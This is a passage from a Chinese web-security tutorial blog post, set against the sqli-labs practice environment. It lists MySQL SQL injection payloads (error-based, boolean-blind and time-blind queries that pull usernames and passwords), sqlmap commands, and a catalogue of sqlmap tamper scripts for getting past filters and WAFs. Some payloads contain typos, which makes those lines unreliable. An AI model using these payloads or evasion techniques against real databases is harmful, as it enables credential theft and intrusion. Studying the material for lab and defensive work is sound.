+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, concat(&#39;~&#39;, (select database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;</span><br></pre></td></tr></table></figure>
+<h5 id="UpdateXml">UpdateXml</h5>
+<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></p>
+<p><strong>xml_target:：</strong> 需要操作的xml片段</p>
+<p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p>
+<p><strong>new_xml：</strong> 更新后的内容</p>
+<p>不过这些参数都不太重要，这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select database())), &#39;test&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select version())), &#39;test&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.27-0ubuntu0.18.0.1&#39;</span><br></pre></td></tr></table></figure>
+<h5 id="Floor">Floor</h5>
+<p>有关<code>floor()</code>函数的注入原理可以看<a href="https://ca0y1h.top/2019/09/17/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">这篇文章</a>。</p>
+<p>固定格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((******), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<p><code>******</code>替换为查询语句即可。</p>
+<ol>
+<li>
+<p>查询数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询某个数据库中的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1, 1), floor(rand()*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询表中的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;, limit 1,1), floor(rand()*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询表中的字段内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from security.users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p>修改limit x,1 可以显示第x个用户的password和username。</p>
+</blockquote>
+<h3 id="布尔盲注">布尔盲注</h3>
+<h4 id="使用场景-v3">使用场景</h4>
+<p>页面没有显示位，也没有SQL语句执行错误信息，只能通过页面返回是否正常来判断注入点。</p>
+<h4 id="Payload-v3">Payload</h4>
+<blockquote>
+<p>有用到二分法的思想</p>
+</blockquote>
+<h5 id="数据库名相关">数据库名相关</h5>
+<ol>
+<li>
+<p>查询数据库个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(schema_name) from information_schema.schemata) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询某一个数据库名的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(schema_name) from information_schema.schemata limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询某个数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select assii(substr(select schema_name from information_schema.schema limit 1,1)1,1)) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h5 id="数据表相关">数据表相关</h5>
+<ol>
+<li>
+<p>查询表的个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询表的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(table_name) from information.schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看某个表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h5 id="字段相关">字段相关</h5>
+<ol>
+<li>
+<p>查看某个表中的字段个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看某个字段名的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(column_name) from infomation_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看某个字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h5 id="记录内容相关">记录内容相关</h5>
+<ol>
+<li>
+<p>查看表中行数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(*) from security.users) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看某个字段内容的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(username) from security.users limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看某个字段的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select username from security.users limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="时间盲注">时间盲注</h3>
+<h4 id="使用场景-v4">使用场景</h4>
+<p>页面上没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，如果if条件成立则页面的返回速度明显慢了5秒。</p>
+<h4 id="Payload-v4">Payload</h4>
+<blockquote>
+<p>与布尔盲注的思想类似</p>
+</blockquote>
+<ol>
+<li>
+<p>判断数据库的个数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select count(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>判断数据库名的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select length(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查询数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1)1,1)))&#x3D;105, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="0x02-SQLMap-Payload">0x02 SQLMap Payload</h2>
+<ol>
+<li>
+<p>以sqlilab中的Less-8为例（布尔型单引号GET盲注），查看sqlmap中使用的payloads，执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-8/?id=1&quot; --dbs --dbms=&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
+<p>首先获取数据库的个数：<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g7y2vi5zukj2141042gn9.jpg" alt="">函数解释：</p>
+<ul>
+<li>
+<p>ORD(string) ：返回字符串首字符的ASCII码值。</p>
+</li>
+<li>
+<p>MID(string，start，length) ：返回字符串的从start开始长度为length的字符串。</p>
+</li>
+<li>
+<p>IFNULL(string1，string2) ：如果string1是NULL则返回string2，如果不是NULL返回string1。</p>
+</li>
+<li>
+<p>CAST(volume as type) 用于数据类型转换，将volume转换成type类型的数据（如这里是将数字转<br>
+换为字符串）。</p>
+</li>
+<li>
+<p>COUNT()： 统计个数。</p>
+</li>
+<li>
+<p>DISTINCT()： 标记只要不同（唯一）的值。</p>
+</li>
+</ul>
+<p>Payload解释：</p>
+<p>0-9的字符ASCII值对应的是48-57，所以sqlmap首先判断的&gt;51也就是&gt;3，因为mysql本身就有六个数据库但world、test、sakila这三个数据库没什么用可以删除，那么最少应该有三个数据库，<code>performance_schema</code>和<code>information_schema</code>和<code>mysql</code>。</p>
+<p>假如数据库的数量是&gt;3的话，那么就相当于<code>1' and true</code>返回页面不会出现问题，如果返回页面不是正确页面的话我们就可以确定一共有三个数据库（都是默认的）或者是由10多个数据库（20多个也是有可能的），十位是1,2总之是小于等于3的。</p>
+<p>再获取每个数据库名（这里也<code>mysql</code>为例）：</p>
+<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g7ymze766qj214q0hm11n.jpg" alt="">其实道理和上述的一样进行猜解，通过判断每一位的ASCII码值来确定每个字母。</p>
+</li>
+<li>
+<p>再以sqlilab中的Less-4为例（基于错误的GET双引号字符型注入），查看sqlmap中使用的payloads，执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-4/?id=1&quot; --level 4 --dbs --dbms=&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
+<p>SQLMap执行的payload如下所示：</p>
+<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g7yniit87tj21f40flq8z.jpg" alt=""></p>
+</li>
+</ol>
+<h2 id="0x03-SQLMap-Tamper">0x03 SQLMap Tamper</h2>
+<p>SQLMap的tamper使用命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql -u [url] --tamper  [模块名]</span><br></pre></td></tr></table></figure>
+<h3 id="常用的tamper脚本">常用的tamper脚本</h3>
+<ol>
+<li>
+<p><a target="_blank" rel="noopener" href="http://apostrophemask.py">apostrophemask.py</a><br>
+适用数据库：ALL<br>
+作用：将引号替换为utf-8，用于过滤单引号<br>
+使用脚本前：tamper(“1 AND ‘1’='1”)<br>
+使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://base64encode.py">base64encode.py</a><br>
+适用数据库：ALL<br>
+作用：替换为base64编码<br>
+使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>
+使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://multiplespaces.py">multiplespaces.py</a><br>
+适用数据库：ALL<br>
+作用：围绕sql关键字添加多个空格<br>
+使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>
+使用脚本后：1 UNION SELECT foobar</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2plus.py">space2plus.py</a><br>
+适用数据库：ALL<br>
+作用：用加号替换空格<br>
+使用脚本前：tamper(‘SELECT id FROM users’)<br>
+使用脚本后：SELECT+id+FROM+users</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://nonrecursivereplacement.py">nonrecursivereplacement.py</a><br>
+适用数据库：ALL<br>
+作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将<br>
+select替换为空）<br>
+使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>
+使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2randomblank.py">space2randomblank.py</a><br>
+适用数据库：ALL<br>
+作用：将空格替换为其他有效字符<br>
+使用脚本前：tamper(‘SELECT id FROM users’)<br>
+使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://unionalltounion.py">unionalltounion.py</a><br>
+适用数据库：ALL<br>
+作用：将union allselect 替换为unionselect<br>
+使用脚本前：tamper(’-1 UNION ALL SELECT’)<br>
+使用脚本后：-1 UNION SELECT</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://securesphere.py">securesphere.py</a><br>
+适用数据库：ALL<br>
+作用：追加特定的字符串<br>
+使用脚本前：tamper(‘1 AND 1=1’)<br>
+使用脚本后：1 AND 1=1 and ‘0having’=‘0having’</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2dash.py">space2dash.py</a><br>
+适用数据库：ALL<br>
+作用：将空格替换为–，并添加一个随机字符串和换行符<br>
+使用脚本前：tamper(‘1 AND 9227=9227’)<br>
+使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2mssqlblank.py">space2mssqlblank.py</a><br>
+适用数据库：Microsoft SQL Server<br>
+测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>
+作用：将空格随机替换为其他空格符号(’%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’,<br>
+‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>
+使用脚本前：tamper(‘SELECT id FROM users’)<br>
+使用脚本后：SELECT%0Eid%0DFROM%07users</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://percentage.py">percentage.py</a><br>
+适用数据库：ASP<br>
+测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL<br>
+9.0<br>
+作用：在每个字符前添加一个%<br>
+使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>
+使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
+</li>
+<li>
+<p>sp_password.py<br>
+适用数据库：MSSQL<br>
+作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>
+使用脚本前：tamper('1 AND 9227=9227-- ')<br>
+使用脚本后：1 AND 9227=9227-- sp_password</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://charencode.py">charencode.py</a><br>
+测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、<br>
+PostgreSQL 8.3, 8.4, 9.0<br>
+作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>
+使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>
+使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://randomcase.py">randomcase.py</a><br>
+测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、<br>
+PostgreSQL 8.3, 8.4, 9.0<br>
+作用：随机大小写<br>
+使用脚本前：tamper(‘INSERT’)<br>
+使用脚本后：INseRt</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://charunicodeencode.py">charunicodeencode.py</a><br>
+适用数据库：ASP、<a target="_blank" rel="noopener" href="http://ASP.NET">ASP.NET</a><br>
+测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>
+作用：适用字符串的unicode编码<br>
+使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>
+使用脚本后：<br>
+%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u<br>
+0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2comment.py">space2comment.py</a><br>
+测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>
+作用：将空格替换为/**/<br>
+使用脚本前：tamper(‘SELECT id FROM users’)<br>
+使用脚本后：SELECT/**/id/**/FROM/**/users</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://equaltolike.py">equaltolike.py</a><br>
+测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>
+作用：将=替换为LIKE<br>
+使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br>
+使用脚本后：SELECT * FROM users WHERE id LIKE 1</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://equaltolike.py">equaltolike.py</a><br>
+测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>
+作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>
+使用脚本前：tamper(‘1 AND A &gt; B’)<br>
+使用脚本后：1 AND GREATEST(A,B+1)=A</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://ifnull2ifisnull.py">ifnull2ifisnull.py</a><br>
+适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>
+测试通过数据库：MySQL 5.0 and 5.5<br>
+作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>
+使用脚本前：tamper(‘IFNULL(1, 2)’)<br>
+使用脚本后：IF(ISNULL(1),2,1)</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://modsecurityversioned.py">modsecurityversioned.py</a><br>
+适用数据库：MySQL<br>
+测试通过数据库：MySQL 5.0<br>
+作用：过滤空格，使用mysql内联注释的方式进行注入<br>
+使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>
+使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2mysqlblank.py">space2mysqlblank.py</a><br>
+适用数据库：MySQL<br>
+测试通过数据库：MySQL 5.1<br>
+作用：将空格替换为其他空格符号(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>
+使用脚本前：tamper(‘SELECT id FROM users’)<br>
+使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://modsecurityzeroversioned.py">modsecurityzeroversioned.py</a><br>
+适用数据库：MySQL<br>
+测试通过数据库：MySQL 5.0<br>
+作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>
+使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>
+使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2mysqldash.py">space2mysqldash.py</a><br>
+适用数据库：MySQL、MSSQL<br>
+作用：将空格替换为 – ，并追随一个换行符<br>
+使用脚本前：tamper(‘1 AND 9227=9227’)<br>
+使用脚本后：1–%0AAND–%0A9227=9227</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://bluecoat.py">bluecoat.py</a><br>
+适用数据库：Blue Coat SGOS<br>
+测试通过数据库：MySQL 5.1,、SGOS<br>
+作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>
+使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>
+使用脚本后：SELECT%09id FROM users where id LIKE 1</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://versionedkeywords.py">versionedkeywords.py</a><br>
+适用数据库：MySQL<br>
+测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>
+作用：注释绕过<br>
+使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL,<br>
+CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS<br>
+CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>
+使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,<br>
+CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(<br>
+32)),CHAR(58,100,114,117,58))#</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://halfversionedmorekeywords.py">halfversionedmorekeywords.py</a><br>
+适用数据库：MySQL &lt; 5.1<br>
+测试通过数据库：MySQL 4.0.18/5.0.22<br>
+作用：在每个关键字前添加mysql版本注释<br>
+使用脚本前：tamper(“value’ UNION ALL SELECT<br>
+CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS<br>
+CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa”)<br>
+使用脚本后：<br>
+value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNUL<br>
+L(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58<br>
+)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’='QDWa</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://space2morehash.py">space2morehash.py</a><br>
+适用数据库：MySQL &gt;= 5.1.13<br>
+测试通过数据库：MySQL 5.1.41<br>
+作用：将空格替换为#，并添加一个随机字符串和换行符<br>
+使用脚本前：tamper(‘1 AND 9227=9227’)<br>
+使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://apostrophenullencode.py">apostrophenullencode.py</a><br>
+适用数据库：ALL<br>
+作用：用非法双字节Unicode字符替换单引号<br>
+使用脚本前：tamper(“1 AND ‘1’='1”)<br>
+使用脚本后：1 AND %00%271%00%27=%00%271</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://appendnullbyte.py">appendnullbyte.py</a><br>
+适用数据库：ALL<br>
+作用：在有效载荷的结束位置加载null字节字符编码<br>
+使用脚本前：tamper(‘1 AND 1=1’)<br>
+使用脚本后：1 AND 1=1%00</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://chardoubleencode.py">chardoubleencode.py</a><br>
+适用数据库：ALL<br>
+作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>
+使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>
+使用脚本后： %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F<br>
+%254D%2520%2554%2541%2542%254C%2545</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://unmagicquotes.py">unmagicquotes.py</a><br>
+适用数据库：ALL<br>
+作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>
+使用脚本前：tamper(“1’ AND 1=1”)<br>
+使用脚本后：1%bf%27 AND 1=1–</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="http://randomcomments.py">randomcomments.py</a><br>
+适用数据库：ALL<br>
+作用：用注释符分割sql关键字<br>
+使用脚本前：tamper(‘INSERT’)<br>
+使用脚本后：I/<strong>/N/</strong>/SERT</p>
+</li>
+</ol>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2019-10-01</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>-><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">#SQL注入</a> <a class="tag-none-link" href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" rel="tag">#web安全基础</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
